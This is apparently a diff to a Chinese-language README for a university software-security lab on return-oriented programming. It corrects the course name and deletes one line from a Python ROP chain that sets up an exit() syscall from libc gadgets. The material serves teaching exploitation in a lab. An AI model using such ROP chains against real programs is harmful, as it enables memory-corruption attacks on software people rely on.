@@ -1,5 +1,5 @@
 # ROP
-该实验是南京大学系统与软件课程ROP实验文档的一部分，本文主要介绍了ROP的基本原理与exploit的编写。通过该文档，可以了解ROP攻击的基本原理，并能够应对含有副作用的ROP gadget。  
+该实验是南京大学系统与软件安全课程ROP实验文档的一部分，本文主要介绍了ROP的基本原理与exploit的编写。通过该文档，可以了解ROP攻击的基本原理，并能够应对含有副作用的ROP gadget。  
 - Buffer Overflow 实验文档及代码。
 [Buffer Overflow](https://github.com/NJUSeclab/Software_Security_Experiments/tree/master/Buffer%20Overflow)  
 - ROP 实验文档及二进制程序。
@@ -161,7 +161,6 @@ p += pack('<I', 0xfffffff)
 
 // exit()
 p += pack('<I', xor_eax_addr + base_libcaddr) # xor eax, eax ; ret
-p += pack('<I', xor_ebx_addr + base_libcaddr) # xor ebx, ebx ; ret
 p += pack('<I', inc_eax_addr + base_libcaddr) # inc eax ; ret
 p += pack('<I', int_addr + base_libcaddr) # int 0x80
 
